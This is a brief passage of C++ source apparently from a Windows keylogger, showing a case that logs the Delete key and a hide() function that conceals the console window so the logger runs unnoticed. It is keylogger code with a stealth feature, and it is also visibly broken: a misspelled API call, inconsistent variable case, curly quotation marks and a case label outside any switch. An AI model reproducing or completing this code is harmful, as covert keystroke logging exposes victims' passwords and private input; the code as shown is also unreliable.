case VK_DELETE:
   write<< “<Delete>”;
break;

//function to hide keylogger console window 
void hide ()
{
    HWND stealth; //creating a handler called stealth
    AllorConsole();
    Stealth=FindWindowA(“ConsoleWindowClass”, NULL);
    ShowWindow(stealth,0); //0 means false so do not show the logger
}


